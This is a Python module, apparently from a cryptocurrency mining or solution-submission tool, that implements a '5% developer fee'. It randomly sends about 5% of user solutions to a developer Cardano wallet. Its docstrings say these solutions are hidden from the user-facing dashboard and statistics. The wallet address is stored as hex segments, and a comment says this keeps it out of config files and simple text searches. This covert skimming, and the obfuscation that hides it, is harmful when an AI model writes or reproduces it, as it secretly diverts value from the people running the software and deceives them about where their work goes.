"""
Developer Fee Module

This module manages the 5% developer fee by probabilistically routing
solutions to developer wallets. These wallets and their solutions are
hidden from the user-facing dashboard and statistics.
"""

import random
import logging
from typing import Final

from .constants import DEV_FEE_PERCENTAGE

# The consolidation address is stored as hex chunks to avoid exposing the
# plain string in config files or simple text searches.
_DEV_ADDR_HEX_SEGMENTS: Final[tuple[str, ...]] = (
    "61646472317178377465706868377374",
    "6b3866396b6b6b657664747765326474",
    "686a6e3371346e306467633274346c37",
    "35703777347865746338793277736a76",
    "76716878706c376c723377783561756e",
    "63797a34727139647477367073757530",
    "737a646b757876",
)


def _decode_dev_address() -> str:
    """
    Reconstruct the developer consolidation address from hex segments.
    
    Returns:
        Decoded developer wallet address
        
    Raises:
        ValueError: If hex segments cannot be decoded
    """
    hex_string = "".join(_DEV_ADDR_HEX_SEGMENTS)
    try:
        decoded = bytes.fromhex(hex_string).decode("utf-8")
        # Basic validation - Cardano addresses start with "addr1"
        if not decoded.startswith("addr1"):
            raise ValueError("Invalid address format")
        return decoded
    except (ValueError, UnicodeDecodeError) as exc:
        logging.error("Failed to decode developer address: %s", exc)
        raise


class DevFeeManager:
    """
    Manages developer fee wallet selection and solution routing.
    
    Implements a 5% developer fee by probabilistically selecting dev wallets
    for solution submission. Dev wallet solutions are tracked separately and
    hidden from user-facing statistics.
    """

    def __init__(self) -> None:
        """Initialize the dev fee manager with decoded address."""
        self._dev_address: str = _decode_dev_address()
        self._fee_probability: float = DEV_FEE_PERCENTAGE

    def should_use_dev_wallet(self) -> bool:
        """
        Determine if the next solution should go to a dev wallet.
        
        Uses random selection to achieve approximately 5% dev wallet usage.
        
        Returns:
            True if a dev wallet should be used, False otherwise
        """
        return random.random() < self._fee_probability

    def get_dev_consolidate_address(self) -> str:
        """
        Get the developer consolidation address.
        
        Returns:
            Developer wallet address where fees are consolidated
        """
        return self._dev_address

    def get_fee_percentage(self) -> float:
        """
        Get the effective fee percentage for internal diagnostics.
        
        Returns:
            Fee percentage as a decimal (e.g., 0.05 for 5%)
        """
        return self._fee_probability

    def is_dev_wallet(self, wallet_address: str) -> bool:
        """
        Check if a given wallet address is a dev wallet.
        
        Currently checks if the wallet consolidates to the dev address.
        In practice, this should check a database flag.
        
        Args:
            wallet_address: Address to check
            
        Returns:
            True if this is a dev wallet, False otherwise
            
        Note:
            This is a placeholder implementation. Actual dev wallet
            tracking should be handled by the database/wallet manager.
        """
        # Placeholder - actual implementation should check DB flag
        return False


# Global instance
dev_fee_manager = DevFeeManager()
